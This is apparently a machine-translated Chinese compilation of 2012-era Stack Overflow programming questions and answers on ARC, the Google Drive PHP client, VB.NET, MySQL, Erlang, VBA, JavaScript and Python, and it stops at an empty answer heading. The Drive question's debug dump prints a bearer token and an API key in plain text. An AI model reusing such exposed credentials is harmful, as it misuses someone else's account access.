来自于保留和释放的前 ARC 思维方式，我试图在 ObjectiveC 中围绕 ARC 进行思考。

在 ARC 之前的日子里，任何返回新创建实例的方法都将使用自动释放池。

```
- (NSString *)description {
     NSString *output = [NSString stringWithFormat:@"max size is: %d", maxSize];
     return output;
 } 
```

保留它是这个新创建实例的工作的接收者。

我很好奇。在ARC世界，你能做到吗？

```
- (NSString *)description {
     NSString *description = [[NSString alloc] initWithFormat:@"max size is: %d", maxSize];
     return description;
} 
```

这在技术上可行吗？合乎逻辑吗？我的意思是——感觉不对。它会干扰保留计数，不是吗？

我的问题也适用于不同的吸气剂。例如：

```
- (NSArray *)items {
    return [NSArray arrayWithArray:items];
} 
```

可

```
- (NSArray *)items {
    return [[NSArray alloc] initWithArray:items];
} 
```

我了解 ARC 为您添加了保留和释放消息。我很想了解在这些情况下这是如何工作的。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-28T15:48:13.490

你可以使用任何一种——这就是 ARC 的美妙之处。它跟踪来自您的项目的每个对象，并知道它是否已经自动释放。所以是的，你可以混合。唯一的问题是如果你写一个库，你需要遵守命名约定，即 init 返回一个保留的对象。

# download - Google Drive API 下载文件 getIo 错误

> ID：11702374
> 
> 赞同：7
> 
> 时间：2012-07-28T15:37:32.583
> 
> 标签：download, google-drive-api

我想创建一个 gDrive 应用程序。I can get downloadUrl (like as string 'https://doc-0k-68-docs.googleusercontent.com/docs/securesc/gf6salc3nfs5me1dnqgnp4crl90gg593/21kfelc8h3l1qvkgskqacnee2pqjt5es/1343484000000/14678698184812381901/14678698184812381901/0B95t2gVGbZ61Sk0yNlY5TTZObUU?h=16653014193614665626&e=download&gd=true' (长度=251))

但我无法通过此链接下载。我想，必须进行一些身份验证。

我试试这个功能，我在[这里](https://developers.google.com/drive/v1/reference/files/get)

```
function downloadFile($service, $file) {
  $downloadUrl = $file->getDownloadUrl();
  if ($downloadUrl) {
    $request = new apiHttpRequest($downloadUrl, 'GET', null, null);
    $httpRequest = $service->getIo()->authenticatedRequest($request);
    if ($httpRequest->getResponseHttpCode() == 200) {
      return $httpRequest->getResponseBody();
    } else {
      // An error occurred.
      return null;
    }
  } else {
    // The file doesn't have any content stored on Drive.
    return null;
  }
} 
```

我犯了一个错误

**在 .... 中调用未定义的方法 apiDriveService::getIo()**

请帮我。我在任何地方都找不到。

```
object(apiHttpRequest)[18]
  protected 'url' => string 'https://doc-0k-68-docs.googleusercontent.com/docs/securesc/gf6salc3nfs5me1dnqgnp4crl90gg593/900384ep39btqvj6j91ssm11lvom8r09/1343635200000/14678698184812381901/14678698184812381901/0B95t2gVGbZ61Sk0yNlY5TTZObUU?h=16653014193614665626&e=download&gd=true&key=AIzaSyA1qi-3-tqpyzxAXhy5c9_EkVGFNsRZ9Fw' (length=295)
  protected 'requestMethod' => string 'GET' (length=3)
  protected 'requestHeaders' => 
    array (size=1)
      'authorization' => string 'Bearer ya29.AHES6ZTgpamuF6g35HuLj2PW_KH06yZhLLNdNLF_MgaiFGLp' (length=60)
  protected 'postBody' => null
  protected 'userAgent' => string 'Tahribat google-api-php-client/0.5.0' (length=36)
  protected 'responseHttpCode' => int 404
  protected 'responseHeaders' => 
    array (size=10)
      'server' => string 'HTTP Upload Server Built on Jul 25 2012 10:54:42 (1343238882)' (length=61)
      'access-control-allow-origin' => string '*' (length=1)
      'access-control-allow-credentials' => string 'false' (length=5)
      'access-control-allow-headers' => string 'authorization' (length=13)
      'access-control-allow-methods' => string 'GET,OPTIONS' (length=11)
      'date' => string 'Mon, 30 Jul 2012 08:01:31 GMT' (length=29)
      'expires' => string 'Mon, 30 Jul 2012 08:01:31 GMT' (length=29)
      'cache-control' => string 'private, max-age=0' (length=18)
      'content-length' => string '0' (length=1)
      'content-type' => string 'text/html; charset=UTF-8' (length=24)
  protected 'responseBody' => boolean false
  public 'accessKey' => null 
```

///////

```
object(DriveFile)[15]
  public 'mimeType' => string 'application/rar' (length=15)
  public 'thumbnailLink' => null
  protected '__labelsType' => string 'DriveFileLabels' (length=15)
  protected '__labelsDataType' => string '' (length=0)
  public 'labels' => 
    object(DriveFileLabels)[16]
      public 'restricted' => boolean false
      public 'hidden' => boolean false
      public 'viewed' => boolean false
      public 'starred' => boolean false
      public 'trashed' => boolean false
  protected '__indexableTextType' => string 'DriveFileIndexableText' (length=22)
  protected '__indexableTextDataType' => string '' (length=0)
  public 'indexableText' => null
  public 'etag' => string '"WtRjAPZWbDA7_fkFjc5ojsEvE7I/MTM0MzM1NDI2OTYwMA"' (length=48)
  public 'lastModifyingUserName' => string 'Pskptbt6' (length=8)
  public 'writersCanShare' => boolean true
  public 'id' => string '0By790Jqkq9pLRDRuUFZ3UWVxdGs' (length=28)
  public 'title' => string '1caec72e95949a693dc0e95eeaeb2a9e.rar' (length=36)
  public 'ownerNames' => 
    array (size=1)
      0 => string 'Pskptbt6' (length=8)
  public 'sharedWithMeDate' => null
  public 'lastViewedByMeDate' => null
  protected '__parentsType' => string 'ParentReference' (length=15)
  protected '__parentsDataType' => string 'array' (length=5)
  public 'parents' => 
    array (size=0)
      empty
  public 'exportLinks' => null
  public 'originalFilename' => string 'Web Elements.rar' (length=16)
  public 'description' => null
  public 'editable' => boolean false
  public 'kind' => string 'drive#file' (length=10)
  public 'quotaBytesUsed' => string '30249130' (length=8)
  public 'fileSize' => string '30249130' (length=8)
  public 'createdDate' => string '2012-07-27T01:55:50.169Z' (length=24)
  public 'md5Checksum' => string '595182e10bcc986cc8dcc41a6e945019' (length=32)
  public 'embedLink' => null
  public 'alternateLink' => string 'https://docs.google.com/file/d/0By790Jqkq9pLRDRuUFZ3UWVxdGs/edit' (length=64)
  public 'permissionsLink' => null
  public 'modifiedByMeDate' => null
  public 'downloadUrl' => string 'https://doc-04-5s-docs.googleusercontent.com/docs/securesc/gf6salc3nfs5me1dnqgnp4crl90gg593/t1ucp1ub6sdcgk7hdatj1it5m5ntoodh/1343635200000/13117762293604295629/14678698184812381901/0By790Jqkq9pLRDRuUFZ3UWVxdGs?h=16653014193614665626&e=download&gd=true' (length=251)
  protected '__userPermissionType' => string 'Permission' (length=10)
  protected '__userPermissionDataType' => string '' (length=0)
  public 'userPermission' => 
    object(Permission)[17]
      public 'withLink' => null
      public 'kind' => string 'drive#permission' (length=16)
      public 'name' => null
      public 'value' => null
      public 'id' => string 'me' (length=2)
      public 'authKey' => null
      public 'etag' => string '"WtRjAPZWbDA7_fkFjc5ojsEvE7I/dLmoyrW_nZG7qLX6EhuNvVbQIq0"' (length=57)
      public 'role' => string 'reader' (length=6)
      public 'photoLink' => null
      public 'type' => string 'user' (length=4)
      public 'additionalRoles' => null
      public 'selfLink' => string 'https://www.googleapis.com/drive/v2/files/0By790Jqkq9pLRDRuUFZ3UWVxdGs/permissions/me' (length=85)
  public 'fileExtension' => string 'rar' (length=3)
  public 'selfLink' => string 'https://www.googleapis.com/drive/v2/files/0By790Jqkq9pLRDRuUFZ3UWVxdGs' (length=70)
  public 'modifiedDate' => string '2012-07-27T01:57:49.600Z' (length=24)
  public 'webContentLink' => string 'https://docs.google.com/uc?id=0By790Jqkq9pLRDRuUFZ3UWVxdGs&export=download' (length=74) 
```

其实我只是想喜欢这个网站。

[http://www.gdriveurl.com/](http://www.gdriveurl.com/)

但是，我只是在我的网站中自动创建每个链接。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2014-04-08T15:28:31.790

我安装了最新的 PHP 客户端库，上面的建议编辑都不起作用。

原始代码

```
 $httpRequest = $service->getIo()->authenticatedRequest($request);
 Fatal error: Call to undefined method Google_Service_Drive::getIo() 
```

第一个建议的更改：

```
$httpRequest = apiClient::$io->authenticatedRequest($request);
Fatal error: Class 'apiClient' not found in ...../Drive/auth.php 
```

第二个建议的变化：

```
$httpRequest = Google_Client::$io->authenticatedRequest($request);
Fatal error: Cannot access private property Google_Client::$io in .../Drive/auth.php 
```

我发现“authenticatedRequest($request);” 在 - src/Google/Auth/OAuth2.php

```
 public function authenticatedRequest(Google_Http_Request $request)
  {
    $request = $this->sign($request);
    return $this->client->getIo()->makeRequest($request);
  } 
```

所以我将调用更改为：

```
 $httpRequest = Google_Auth_OAuth2::authenticatedRequest($request); 
```

但它返回错误：

致命错误：不在对象上下文中使用 $this

终于找到了解决方案，这里是完整的代码：

```
function downloadFile($service, $downloadUrl,$client) {

if ($downloadUrl) {
  $request = new Google_Http_Request($downloadUrl, 'GET', null, null);

  $SignhttpRequest = $client->getAuth()->sign($request);
  $httpRequest = $client->getIo()->makeRequest($SignhttpRequest);

  if ($httpRequest->getResponseHttpCode() == 200) {
    return $httpRequest->getResponseBody();
  } else {
  // An error occurred.
    return null;
  }
 } else {
  // The file doesn't have any content stored on Drive.
   return null;
 }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T19:36:45.853

更改此行：

```
 $httpRequest = $service->getIo()->authenticatedRequest($request); 
```

经过：

```
 $httpRequest = apiClient::$io->authenticatedRequest($request); 
```

我自己犯了错误，之后，通过改变线路，我不再有问题了。

$service 显然是关于 apiClient 而不是 apiDriveService。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-04T12:50:19.303

```
$request = new Google_HttpRequest($downloadUrl, 'GET', null, null);
$httpRequest = Google_Client::$io->authenticatedRequest($request); 
```

对于新库 google-api-php-client-0.6.0.tar.gz

# javascript - 变量未定义

> ID：11702384
> 
> 赞同：-7
> 
> 时间：2012-07-28T15:39:04.290
> 
> 标签：javascript

角色=“经理”，它说“经理”是未定义的。请帮助。

```
 function onSubmitClick(role)
        {
        .....

        <input type="b

utton" class="button" name="btn_Submit" id = "btn_Submit"  value="Submit"
                                                            onMouseOver="showToolTipMessage(T0097);showStatusBarMessage(T0097)"
                                                            onMouseOut="hideStatusBarMessage()"
                                                            onFocus="showStatusBarMessage(T0097)"
                                                            onBlur="hideStatusBarMessage()"
                                                            onClick="return onSubmitClick(<%=cstr(Role)%>)"> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T15:41:57.717

你需要报价：

```
onClick="return onSubmitClick('<%=cstr(Role)%>')">
//                            ^---------------^ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T15:42:58.330

当您单击 <%=cstr(Role)%> 时，它会评估为 manager 吗？尝试以下操作：

```
onClick="return onSubmitClick('<%=cstr(Role)%>')" 
```

# c# - 使用 SizeMode ZOOM 从 Picturebox 中选择颜色

> ID：11702387
> 
> 赞同：2
> 
> 时间：2012-07-28T15:39:26.870
> 
> 标签：c#, vb.net

如何从 ZOOMed 图片框中获取点的颜色（鼠标光标的位置）？

我当前的代码*不起作用*

```
Private Sub pickColor(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles picBox.MouseClick
    Dim TempBitmap As New Bitmap(picBox.Image)
    Dim MyColor As Color
    MyColor = TempBitmap.GetPixel(e.X, e.Y)
End Sub 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-30T16:28:55.157

你可以尝试这样的事情：

```
Private Sub pickColor(ByVal sender As Object, ByVal e As MouseEventArgs) _
                      Handles picBox.MouseClick
  Using bmp As New Bitmap(picBox.ClientSize.Width, _
                          picBox.ClientSize.Height)
    picBox.DrawToBitmap(bmp, picBox.ClientRectangle)
    MessageBox.Show(bmp.GetPixel(e.X, e.Y).ToString())
  End Using
End Sub 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-30T16:32:16.037

我不知道有一种方法叫做`DrawToBitmap`. @LatsTech 比我的要好得多。我的解决方案只是简单地尝试将 Picturebox 的内容重新创建到 Bitmap 中。

```
 Private Sub PictureBox1_MouseClick(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles PictureBox1.MouseClick
    Dim bits As New Bitmap(PictureBox1.Width, PictureBox1.Height)
    Dim context As Graphics = Graphics.FromImage(bits)

    '' Create picturebox background
    context.FillRectangle(New SolidBrush(PictureBox1.BackColor), _
                          0, 0, bits.Width, bits.Height)

    '' Try to reproduce zoomed image thumbnail
    Dim ratio As Double = 1.0
    Dim imageWidth As Integer = PictureBox1.Image.Width
    Dim imageHeight As Integer = PictureBox1.Image.Height

    If imageWidth > bits.Width Then
        ratio = bits.Width / imageWidth

        imageWidth = bits.Width
        imageHeight *= ratio
    End If

    If imageHeight > bits.Height Then
        ratio = bits.Height / imageHeight

        imageHeight = bits.Height
        imageWidth *= ratio
    End If

    context.DrawImage(PictureBox1.Image, _
                      New Rectangle((bits.Width - imageWidth) / 2, _
                                    (bits.Height - imageHeight) / 2, _
                                    imageWidth, imageHeight), _
                      New Rectangle(0, 0, PictureBox1.Image.Width, _
                                    PictureBox1.Image.Height), _
                      GraphicsUnit.Pixel)

    MsgBox(bits.GetPixel(e.X, e.Y).ToString)
End Sub 
```

# php - 输出一个类别，然后是其中的产品

> ID：11702392
> 
> 赞同：0
> 
> 时间：2012-07-28T15:39:53.397
> 
> 标签：php, mysql

我在mysql数据库中有3个表，类别，产品和cat_pro，类别表包含类别，产品表包含产品及其价格，cat_pro分别包含类别和产品的主键。一个类别可以包含许多产品。Category 表有 category_id 和 category name，products 表有 product_id、product_name 和 price.cat_pro 表用于内部连接，因为它包含类别和产品的外键。

我想要的是一个 sql 查询语句，它输出一个类别，然后是该类别中的产品及其价格，直到所有类别和产品以垂直方式耗尽。问题在于以下面的方式输出信息。这是其产品后跟的类别例如

```
Category A
product 1 250$
product 2 450$
Category B
product 1 100$
product 2 400$
Category C
product 1 300$
product 2 100$ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T17:20:02.220

我看到你将你的问题标记为 PHP，所以我会给你 PHP-MySQL 的方法来做到这一点。代码应该是这样的（将列名调整为您自己的架构）

```
<?php
$query = "SELECT * from category c inner join cat_pro cp on c.category_id = cp.category_id
  inner join product p on cp.product_id = p.product_id order by c.cateogry_id desc";
$res = mysqli_query($query);
$lastCat = "";
while($row = mysqli_fetch_array($res)) {
  if($lastCat != $row["category_name"]) echo $row["category_name"]."<br/>";
  echo $row["product_id"]." ".$row["product_price"]."&#36;<br/>";
}
?> 
```

# map - erlang映射函数

> ID：11702395
> 
> 赞同：1
> 
> 时间：2012-07-28T15:40:35.293
> 
> 标签：map, erlang, arity

我是 Erlang 的新手，所以请原谅我的幼稚。

我正在尝试重写我用其他语言编写的函数。其中之一是 Jaccard 位索引。

在 python haskell 和 clojure 中，它的工作方式如下：

```
xs = [1,1,0,0,1,1,0,0,1,1,0,0]
ys = [1,0,1,0,1,0,1,0,1,0,1,0]

# python 3.X
def jaccard_bit_index(A,B):
    i = sum(map(operator.mul ,A,B)) 
    return  i / (sum(A) + sum(B) - i)

-- haskell
jaccrd_bit_index a b =
    count / ((sum a) + (sum b) - count)
    where
      count = sum $ zipWith (*) a b

%% clojure
(defn jaccard-bit-index [a b]
  (let [binarycount (apply + (map * a b))]
    (/ binarycount
       (- (+ (apply + a) (apply + b))
          binarycount)))) 
```

我认为我的问题是我只知道 Erlang 的

`map(Fun, List1) -> List2`

并且每次我在使用类似于以下内容之前完成它：

`map(Fun, List1, List2) -> List3`

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-28T16:32:21.300

我敢打赌您正在搜索的是模块中的`zipwith`功能`list`（http://www.erlang.org/doc/man/lists.html）。它类似于`zipWith`您使用的 haskell 函数，并且具有以下类型：

```
zipwith(Combine, List1, List2) -> List3 
```

你可能会使用类似的东西：

```
Count = lists:sum(lists:zipwith(fun(X, Y) -> X*Y end, A, B)) 
```

# vba - 是否可以使用 VBA 在 Microsoft Word 中创建树视图？

> ID：11702396
> 
> 赞同：2
> 
> 时间：2012-07-28T15:41:07.080
> 
> 标签：vba, ms-word

我正在研究写小说和故事的软件，它们具有基本相同的组织格式。他们在旁边有一棵树和用于组织的文件夹。这里有些例子：

[http://storyist.com/assets/screenshots/StoryistCollage-Full.jpg](http://storyist.com/assets/screenshots/StoryistCollage-Full.jpg) [http://www.literatureandlatte.com/scrivener_pages/screenshotcommentary.php](http://www.literatureandlatte.com/scrivener_pages/screenshotcommentary.php)

我有 Microsoft Word 并且是一名程序员（除其他外），我想知道是否有一种方法可以使用 VBA 控件并在 Word 中创建这种外观和组织过程。

有没有办法做到这一点？如果有，我将如何开始？或者，这是我需要独立做的事情吗？

编辑：这是我正在寻找的：

[http://writingoutliner.com/software-features/project-based-writing-for-long-documents.php](http://writingoutliner.com/software-features/project-based-writing-for-long-documents.php)

这是否可能仅使用 VBA？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-29T02:31:54.863

你的问题如果分解会是这样的

1.  我想知道是否有一种方法可以使用 VBA 控件并在 Word 中创建这种外观和组织过程

2.  有没有办法做到这一点？如果有，我将如何开始？

3.  这是我需要独立做的事情吗？

* * *

不幸的是，如果您想要那种专业的外观，Word 将是一个错误的选择。如果您想要独立的，我建议您创建一个 CHM（已编译的帮助模块）文件。它看起来像您的 Windows 帮助文件之一。

![在此处输入图像描述](../Images/61108b48929a11e94adbc7d1c673f3ba.png)

有许多免费软件可以为您创建 CHM 文件。一个这样的链接是[here](http://www.sparkmylife.com/how-to-create-your-own-chm-file.html)。

如果您想要一个非常棒的工具（*我使用相同的工具，不幸的是它不是免费的*），请查看[帮助和手册 6](http://www.helpandmanual.com/)

如果你仍然想用 word 来做，你将不得不使用 VBA，然后在用户窗体中使用 Treeview 控件。Treeview 最大的缺点是不可分发。要了解如何使用 Treeview 控件，请[在此处](https://stackoverflow.com/questions/11280540/listbox-add-a-combobox-as-item)查看我的其他回复。

# php - php/mysql 排序随机日期

> ID：11702398
> 
> 赞同：0
> 
> 时间：2012-07-28T15:41:18.660
> 
> 标签：php, mysql, date

在寻找在两个固定时间戳之间生成随机日期的方法时，我在 SO 上发现了这个很棒的功能：

```
 function randomDate($start_date, $end_date)
{
    // Convert to timestamps
    $min = strtotime($start_date);
    $max = strtotime($end_date);

    // Generate random number using above bounds
    $val = rand($min, $max);

    // Convert back to desired date format
    return date('Y-m-d H:i:s', $val);
} 
```

[来源和信用](https://stackoverflow.com/questions/1972712/generate-random-date-between-two-dates-using-php/10103901#10103901)

但我正在寻找一种按顺序生成日期的方法（开始日期到结束日期），因为我已经使用它来生成要插入数据库的日期。

问题是我的帖子是`ORDER BY id DESC`“按原样”使用功能，因为它们是随机的，日期最终不同步。

**IE：**

```
post id 4 - date = 2010-07-11 14:14:10
post id 3 - date = 2012-02-22 18:23:21
post id 2 - date = 2011-03-17 13:52:47
post id 1 - date = 2011-08-14 15:33:50 
```

我需要它们与帖子 ID 同步。

现在您的想法为什么不将查询更改为`ORDER BY date DESC`？...嗯，这会弄乱我已经编写的 99% 的代码，因为还有其他列/行依赖于它`ORDER BY id DESC`，因此在插入数据库时​​对日期进行排序是唯一的解决方案。

**更新：**

这是我尝试使用 madfriend 代码但所有日期都相同我哪里出错了？

```
function randomDate($startdate, $enddate){
 $min = strtotime($startdate);
 $max = strtotime($enddate);
 $val = rand($min, $max);
 return date('Y-m-d H:i:s', $val);
}

$query = "SELECT * FROM foo";
$num   = mysql_num_rows(mysql_query($query));

$randate = randomDate('2010-07-12 09:13:40', '2012-06-12 09:13:40');

$dates = array($randate);
for ($i = 0; $i < $num; $i++) {
    $dates[] = randomDate($startdate, $enddate);
}
sort($dates);
while($date = array_shift($dates)) {

$update = "UPDATE foo SET date='{$date}'";
 mysql_query($update);

} 
```

加上得到 `Notice: Undefined variable: startdate`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T15:56:20.927

我不太确定您是在谈论创建还是修改现有行。

*更新*：这里的基本思想很简单。`SELECT COUNT(*) FROM your_posts_table`首先，计算带有查询的帖子数。在那之后：

```
// $num is number of posts
$dates = array();
for ($i = 0; $i < $num; $i++) {
    $dates[] = randomDate($startdate, $enddate);
}
sort($dates); // Sort dates in ascending order
while($date = array_shift($dates)) {
    // now $date won't be lower than it was in previous iterations.
    // use it to update your table
} 
```

*插入*：如果您正在谈论插入并且想要使最新的发布日期随机但最大，那么您可以这样做：

*   首先，选择最后添加的发布日期。
*   其次，调用`randomDate`设置`$startdate`为最后添加帖子的日期。
*   最后，插入具有此日期的新行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T16:40:41.370

```
function randomDate($startdate, $enddate){
 $min = strtotime($startdate);
 $max = strtotime($enddate);
 $val = rand($min, $max);
 return date('Y-m-d H:i:s', $val);
}

$query = "SELECT * FROM foo";
$num   = mysql_num_rows(mysql_query($query));

$randate = randomDate('2010-07-12 09:13:40', '2012-06-12 09:13:40');

$dates = array($randate);
for ($i = 0; $i < $num; $i++) {
    $dates[] = randomDate($startdate, $enddate);
}
sort($dates);
while($date = array_shift($dates)) { 
```

此查询一次更新所有行：

```
$update = "UPDATE foo SET date='{$date}' ";
 mysql_query($update);

} 
```

可能是想使用

```
$update = "update foo set date='{$date}' where id = (select id from foo where date is not null order by id limit 1)"; 
```

（为此，您需要在开始更新之前将数据库中的每个日期设置为空`update foo set date=null`：）

你也不应该使用 myslq_query ..

# android - android广播接收器和双SIM卡

> ID：11702402
> 
> 赞同：1
> 
> 时间：2012-07-28T15:41:50.713
> 
> 标签：android, broadcastreceiver

我开发了一个有来电接收器的应用程序，它适用于所有手机。一位用户拥有一部双 SIM 卡安卓手机。该应用程序适用于第一个 SIM 卡。但是当有人调用他的第二张 SIM 卡时，我们的应用程序不会被调用。

有人可以指导一下，出了什么问题，或者Android有什么限制吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T13:00:36.720

任何基于 Android 构建的应用程序都将保证仅适用于单 SIM 卡手机。因为 Android 不支持多个 SIM 卡，至少从 SDK 来看是这样。已创建多 SIM 卡设备的设备制造商正在自行开发。欢迎您联系您的设备制造商，看看他们是否有 SDK 插件或允许您访问第二张 SIM 卡的东西。

# javascript - 我有 2 个 js 函数，一个正在取消另一个

> ID：11702404
> 
> 赞同：0
> 
> 时间：2012-07-28T15:41:55.653
> 
> 标签：javascript

我查看了常见问题解答，但无法弄清楚是什么原因造成的（在 js 中）。我正试图让一些东西尽快上线，我暂时绕过更好的动画，可能还有 AJAX。

我要做的是将两个外部 php 页面包含到当前页面，一个是画廊滑块，另一个是画廊图像将出现的位置。这是我当前正在测试的页面的链接，因此您可以看到：

[http://www.chrisjohndesigns.com/artwork-conventions.php](http://www.chrisjohndesigns.com/artwork-conventions.php)

所以我使用的代码是简单的替换 .innerHTML 调用，其中左右箭头调用下一个画廊 div，然后该画廊中的缩略图调用出现在下面的艺术品。左右箭头可以正常工作，但是只要单击任何缩略图（并且它们确实可以正常工作），左右箭头就会停止工作，并且您会卡在您选择的任何帧上。

以下是约定页面中的代码：

```
 <div id="field">
    <div id="gallery-callout">
      <div class="thumbs-slider-field-container" id="generic-slider">
        <div class="thumbs-slider-field" >
          <div id="prev">
            <img src="images/gallery-scroll-left.png" width="42" height="120" />
          </div>
          <div id="thumbs-slider">
            <img src="images/thumbs/digital-art/thumb-space-oddity.jpg" id="thumb-space-odity" onclick="changeDiv('space-oddity')"/>
           <img src="images/thumbs/digital-art/thumb-atomic-nurse.jpg" id="thumb-nurse" onclick="changeDiv('nurse')"/>
           <img src="images/thumbs/digital-art/thumb-zombie-make-over.jpg" id="thumb-zombie-makeover" onclick="changeDiv('zombie-makeover')"/> 
           <img src="images/thumbs/digital-art/thumb-fanart-trigun.jpg" id="thumb-trigun" onclick="changeDiv('trigun')"/>
           <img src="images/thumbs/digital-art/thumb-shadowrun.jpg" id="thumb-shadowrun" onclick="changeDiv('shadowrun')"/> 
         </div>
         <div id="next">
           <img src="images/gallery-scroll-left.png" width="42" height="120"  onclick="callSlider('conventions2')" />
         </div>
        </div>
      </div>
    </div>
    <div class="rule">
  </div>
  <div class="entry" style="margin-bottom:0px;">
    <h4 style="color:#ffffff; margin:0px;">| <a href="artwork.php"> artwork </a> > <a href="artwork-conventions.php"> conventions</a></h4>
  </div>
  <div class="gallery-frame" id="generic">
    <h1 style="margin-top:5px; margin-bottom:10px;">CONVENTION ARTWORK</h1>
    <div class="artwork">
      <img src="images/artwork/portfolio-design/logos/atomic-heart/atomicH-heart_0910.png" />  
    </div>
    <div class="rule">
  </div>
  <p>Here you will find arwork produced for (or for sale at) the conventions that Atomic Glam attends. Our premier convention is Anime Weekend Atlanta held in Atlanta each September.<br />(Above: The Atomic Heart Logo of Atomic Glam)</p>

  <div style="display:none;">
    <?php include("artwork-gallery-digital.php"); ?>
    <?php include("sliders/slider-artwork-conventions.php"); ?>
  </div>
</div> 
```

我正在使用的js：

```
<script type="text/javascript">
altViews = function(next_img) {
    document.getElementById("bigPicture").src = next_img;
}

function changeDiv(id) {
var target = document.getElementById('generic');
var id = document.getElementById(id);
target.innerHTML = id.innerHTML; 
}

function callSlider(slides) {
var target2 = document.getElementById('generic-slider');
var slides = document.getElementById(slides);
target2.innerHTML = slides.innerHTML; 
}

</script> 
```

滑块示例：

```
<div class="thumbs-slider-field" id="conventions1">
  <div id="prev">
    <img src="../images/gallery-scroll-left.png" width="42" height="120" />
  </div>
  <div id="thumbs-slider">
    <img src="../images/thumbs/digital-art/thumb-space-oddity.jpg" id="thumb-space-odity" onclick="changeDiv('space-oddity')"/>
    <img src="../images/thumbs/digital-art/thumb-atomic-nurse.jpg" id="thumb-nurse" onclick="changeDiv('nurse')"/>
    <img src="../images/thumbs/digital-art/thumb-zombie-make-over.jpg" id="thumb-zombie-makeover" onclick="changeDiv('zombie-makeover')"/> 
    <img src="../images/thumbs/digital-art/thumb-fanart-trigun.jpg" id="thumb-trigun" onclick="changeDiv('trigun')"/>
    <img src="../images/thumbs/digital-art/thumb-shadowrun.jpg" id="thumb-shadowrun" onclick="changeDiv('shadowrun')"/> 
  </div>
  <div id="next">
    <img src="../images/gallery-scroll-left.png" width="42" height="120"  onclick="callSlider('conventions2')" />
  </div>
</div> 
```

任何想法为什么一个抵消另一个？

# vwdexpress - MS Visual Web Developer 2010 Express 不会保存状态

> ID：11702407
> 
> 赞同：0
> 
> 时间：2012-07-28T15:42:14.313
> 
> 标签：vwdexpress

我的 VWD 2010 Express 已停止保存状态，每次我重新打开一个项目时，所有文件都会关闭。它可以正常工作几个月，每当我打开一个项目时，我关闭时打开的所有文件都会重新打开。我尝试删除我的 .suo 文件，但没有任何区别。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T23:03:51.823

在 Windows 菜单中选择“重置窗口布局”

# javascript - 创建一个复选框按钮的哈希值，这些按钮在点击时在 Twitter Bootstrap Button 组中处于活动状态

> ID：11702408
> 
> 赞同：1
> 
> 时间：2012-07-28T15:42:19.477
> 
> 标签：javascript, jquery, twitter-bootstrap

我有多组[Twitter Bootstrap 复选框组](http://twitter.github.com/bootstrap/javascript.html)。当单击任何一个复选框按钮时，我想创建所有活动（即，Bootsrtap 添加“活动”类）按钮的哈希。假设点击几下后 html 是这样的：

```
<div id="horizontal" class="btn-group" data-toggle="buttons-checkbox">
  <button class="btn active" data-hposition="1">Left</button>
  <button class="btn" data-hposition="2">Middle</button>
  <button class="btn active"data-hposition="3">Right</button>
</div>
<div id="vertical" class="btn-group" data-toggle="buttons-checkbox">
  <button class="btn" data-vposition="1">Top</button>
  <button class="btn active" data-vposition="2">Center</button>
  <button class="btn active" data-vposition="3">Bottom</button>
</div> 
```

我一开始很简单，只有一个 div，但我没有得到正确的结果：

```
<script>
  $('#horizonatal').click( function(){
      var paramsHash = {};
      var hids = [];
    $('.active').each( function() {
      paramsHash.hids.push($(this).data('hposition'));
  })
      console.log(paramsHash.hids);    
})
</script> 
```

使用上面的 html，当我单击“右”时，我会`[1,undefined]`在控制台中看到类似的东西。

最终，我想得到一个散列到 Post like`{ {'hids', [ 1, 3 ]}, {'vids', [ 2, 3, ]} }`

我尝试了一个[jsfiddle](http://jsfiddle.net/YGxxC/7/)，但我认为我没有正确加载 Bootstrap 的东西，因为我没有看到按钮处于活动状态。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T15:54:14.580

那是因为您的数据属性中有拼写错误（*在小提琴上*），并且您选择了所有`.active`不属于*水平*div 的类，并且由于它们没有*data-hposition*属性，因此它返回*undefined*，请尝试以下操作：

```
$('#horizontal').click( function(){
      var paramsHash = {
              hids: [],
            //vidz: []
          }
    $('.active', this).each( function() {
      paramsHash.hids.push($(this).data('hposition'));
   // paramsHash.vidz.push($(this).data('classroom'));
    })
      console.log(paramsHash);    
}) 
```

[演示](http://jsfiddle.net/YGxxC/1/)

* * *

请注意，它们是*按钮*标签而不是单选按钮。

# python - 通过偶数和奇数索引将列表分成两半？

> ID：11702414
> 
> 赞同：28
> 
> 时间：2012-07-28T15:42:59.470
> 
> 标签：python, list, split

> **可能重复：**
> [Python 程序将列表拆分为两个具有交替元素的列表](https://stackoverflow.com/questions/1442782/python-program-to-split-a-list-into-two-lists-with-alternating-elements)

我有一个这样的列表：

```
list1 = [blah, 3, haha, 2, pointer, 1, poop, fire] 
```

我想要的输出是：

```
list = [3, 2, 1, fire] 
```

所以我想要的是列出前一个列表的偶数元素。我尝试使用`for`语句并尝试删除第 2 个元素，同时将它们附加到列表中，但没有成功：

```
count = 0
for a in list1:
 list2.append(a)
 if count % 2 = = 1:
  list2.pop(count)

print list2 
```

有什么建议么？

* * *

## 回答 #1

> 赞同：55
> 
> 时间：2012-07-28T15:48:42.603

您可以使用列表切片。下面的代码片段就可以了。

```
list1 = ['blah', 3, 'haha', 2, 'pointer', 1, 'poop', 'fire']
listOdd = list1[1::2] # Elements from list1 starting from 1 iterating by 2
listEven = list1[::2] # Elements from list1 starting from 0 iterating by 2
print listOdd
print listEven 
```

**输出**

```
[3, 2, 1, 'fire']
['blah', 'haha', 'pointer', 'poop'] 
```

* * *

## 回答 #2

